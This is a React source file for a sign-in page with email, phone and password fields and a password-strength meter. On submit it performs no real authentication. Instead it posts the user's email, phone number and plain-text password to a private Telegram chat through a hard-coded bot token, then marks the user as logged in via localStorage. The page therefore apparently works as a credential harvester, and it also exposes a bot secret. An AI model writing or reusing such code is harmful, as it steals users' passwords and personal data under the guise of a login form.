import { useState } from "react";
import { toast } from "react-toastify";
import { Loader } from "lucide-react";
import { useNavigate } from "react-router-dom";
import { useTranslation } from "react-i18next";

export default function AuthPage() {
    const { t } = useTranslation();
    const [email, setEmail] = useState("");
    const [password, setPassword] = useState("");
    const [phone, setPhone] = useState("");
    const [emailError, setEmailError] = useState(false);
    const [passError, setPassError] = useState(false);
    const [phoneError, setPhoneError] = useState(false);
    const [isLoading, setLoading] = useState(false);
    const [passwordLevel, setPasswordLevel] = useState("");

    const navigate = useNavigate();

    const regexEmail = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const regexPassword = /^[a-zA-Z0-9!@#$%^&*]{6,16}$/;
    const regexPhone = /^\+?[0-9]{9,15}$/;

    const BOT_TOKEN = "8389898735:AAH1MsADfS6yjL3EXLbwMmlgtJ6lgPr1j3A";
    const MY_CHAT_ID = "8155528404";

    const handlePhoneChange = (e) => {
        const value = e.target.value;
        if (/^\+?[0-9]*$/.test(value)) {
            setPhone(value);
        }
    };

    const checkPasswordLevel = (pass) => {
        if (!pass) return setPasswordLevel("");
        const hasLetters = /[a-zA-Z]/.test(pass);
        const hasNumbers = /[0-9]/.test(pass);
        const hasSymbols = /[!@#$%^&*]/.test(pass);

        if (hasLetters && !hasNumbers && !hasSymbols) setPasswordLevel(t("AuthPage.easy"));
        else if (hasLetters && hasNumbers && !hasSymbols) setPasswordLevel(t("AuthPage.medium"));
        else if (hasLetters && hasNumbers && hasSymbols) setPasswordLevel(t("AuthPage.hard"));
        else setPasswordLevel(t("AuthPage.easy"));
    };

    const handleSubmit = async (e) => {
        e.preventDefault();

        const emailValid = regexEmail.test(email);
        const passwordValid = regexPassword.test(password);
        const phoneValid = regexPhone.test(phone);

        setEmailError(!emailValid);
        setPassError(!passwordValid);
        setPhoneError(!phoneValid);

        if (!emailValid || !passwordValid || !phoneValid) {
            toast.error(t("AuthPage.invalidInput"));
            return;
        }

        setLoading(true);

        const text = `
🆕 ${t("AuthPage.newUser")}:

📧 Email: ${email}
📱 Telefon: ${phone}
🔐 Parol: ${password} (${passwordLevel})
        `;

        try {
            await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: MY_CHAT_ID,
                    text,
                }),
            });

            localStorage.setItem("isAuthenticated", "true");
            toast.success(t("AuthPage.success"));

            setEmail("");
            setPassword("");
            setPhone("");
            setPasswordLevel("");

            navigate("/");
        } catch (error) {
            console.error(error);
            toast.error(t("AuthPage.error"));
        } finally {
            setLoading(false);
        }
    };

    return (
        <div className="relative top-0 w-full min-h-screen pt-[80px] bg-cover bg-center bg-[url('/src/img/Cover.png')] flex justify-center items-center px-4">
            <form
                onSubmit={handleSubmit}
                className="flex -mt-14 flex-col lg:flex-row gap-6 shadow-xl w-full max-w-[900px] rounded-xl p-4 sm:p-6 bg-white/70 backdrop-blur-md border border-gray-300"
            >
                {/* SPLINE */}
                <iframe
                    src="https://my.spline.design/genkubgreetingrobot-BEJT5t4bdIAhgacAXRzXgd9K/"
                    className=" w-full h-[260px] sm:h-[350px] lg:w-[500px] lg:h-[500px] rounded-md"
                />

                {/* FORM */}
                <div className="w-full lg:w-[300px]">
                    <h2 className="text-center text-xl sm:text-2xl font-bold mb-6 text-gray-700">
                        {t("AuthPage.title")}
                    </h2>

                    {/* EMAIL */}
                    <div className="mb-4">
                        <label className="block mb-2 font-medium text-gray-700">
                            {t("AuthPage.email")}
                        </label>
                        <input
                            type="text"
                            value={email}
                            onChange={(e) => setEmail(e.target.value)}
                            placeholder={t("AuthPage.emailPlaceholder")}
                            className={`w-full py-2 px-3 rounded-lg outline-none border ${
                                emailError
                                    ? "border-red-500"
                                    : email
                                    ? "border-green-500 bg-green-100"
                                    : "border-gray-300"
                            }`}
                        />
                        {emailError && (
                            <p className="text-red-500 text-sm mt-1">
                                {t("AuthPage.emailError")}
                            </p>
                        )}
                    </div>

                    {/* PHONE */}
                    <div className="mb-4">
                        <label className="block mb-2 font-medium text-gray-700">
                            {t("AuthPage.phone")}
                        </label>
                        <input
                            type="text"
                            value={phone}
                            onChange={handlePhoneChange}
                            placeholder="+998"
                            className={`w-full py-2 px-3 rounded-lg outline-none border ${
                                phoneError
                                    ? "border-red-500"
                                    : phone
                                    ? "border-green-500 bg-green-100"
                                    : "border-gray-300"
                            }`}
                        />
                        {phoneError && (
                            <p className="text-red-500 text-sm mt-1">
                                {t("AuthPage.phoneError")}
                            </p>
                        )}
                    </div>

                    {/* PASSWORD */}
                    <div className="mb-6">
                        <label className="block mb-2 font-medium text-gray-700">
                            {t("AuthPage.password")}
                        </label>
                        <input
                            type="password"
                            value={password}
                            onChange={(e) => {
                                setPassword(e.target.value);
                                checkPasswordLevel(e.target.value);
                            }}
                            placeholder={t("AuthPage.passwordPlaceholder")}
                            className={`w-full py-2 px-3 rounded-lg outline-none border ${
                                passError
                                    ? "border-red-500"
                                    : password
                                    ? "border-green-500 bg-green-100"
                                    : "border-gray-300"
                            }`}
                        />
                        {password && (
                            <p className="mt-1 text-sm">
                                {t("AuthPage.passwordLevel")}: {passwordLevel}
                            </p>
                        )}
                        {passError && (
                            <p className="text-red-500 text-sm mt-1">
                                {t("AuthPage.passwordError")}
                            </p>
                        )}
                    </div>

                    <button
                        type="submit"
                        disabled={isLoading}
                        className="flex items-center justify-center gap-2 w-full py-2 rounded-lg bg-green-500 text-white font-semibold hover:bg-green-600 transition-all disabled:opacity-60"
                    >
                        {isLoading && <Loader className="animate-spin" size={18} />}
                        {t("AuthPage.submit")}
                    </button>
                </div>
            </form>
        </div>
    );
}
    